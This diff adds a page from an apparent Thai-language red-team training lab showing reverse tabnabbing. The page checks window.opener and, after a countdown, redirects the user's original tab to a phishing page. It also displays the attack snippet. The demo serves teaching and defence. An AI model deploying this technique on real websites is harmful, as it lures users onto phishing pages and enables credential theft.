@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="th">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Partner Security Blog — Red Team Lab</title>
+  <link rel="stylesheet" href="../style.css">
+</head>
+<body>
+  <main>
+    <p class="tag">EXTERNAL SITE · PORT 9000</p>
+    <h1>Partner Security Blog</h1>
+    <p>ในสถานการณ์จริง หน้านี้อาจเป็นเว็บไซต์ภายนอกที่ถูกโจมตีหรือถูก Hacker ควบคุม</p>
+
+    <section class="card">
+      <h2>Red Team Debug Panel</h2>
+      <p id="status">กำลังตรวจสอบ window.opener...</p>
+      <p id="countdown"></p>
+    </section>
+
+    <pre class="result"><code>const victimTab = window.opener;
+const phishingUrl = new URL("phishing.html", location.href);
+
+if (victimTab) {
+  victimTab.location.href = phishingUrl;
+}</code></pre>
+  </main>
+
+  <script>
+    const status = document.querySelector("#status");
+    const countdown = document.querySelector("#countdown");
+    const hasOpener = Boolean(window.opener && !window.opener.closed);
+
+    if (!hasOpener) {
+      status.textContent = "ไม่พบ window.opener — Trusted Site ป้องกันแล้ว";
+      countdown.textContent = "Payload หยุดทำงาน";
+    } else {
+      status.textContent = "พบ window.opener — External Site เข้าถึงแท็บต้นทางได้";
+
+      let seconds = 3;
+      countdown.textContent = `เปลี่ยนแท็บต้นทางใน ${seconds} วินาที`;
+
+      const timer = setInterval(() => {
+        seconds -= 1;
+
+        if (seconds === 0) {
+          clearInterval(timer);
+          const phishingUrl = new URL("phishing.html", window.location.href);
+          window.opener.location.href = phishingUrl.href;
+          countdown.textContent = "เปลี่ยนแท็บต้นทางแล้ว ลองกลับไปดูแท็บเดิม";
+          return;
+        }
+
+        countdown.textContent = `เปลี่ยนแท็บต้นทางใน ${seconds} วินาที`;
+      }, 1000);
+    }
+  </script>
+</body>
+</html>
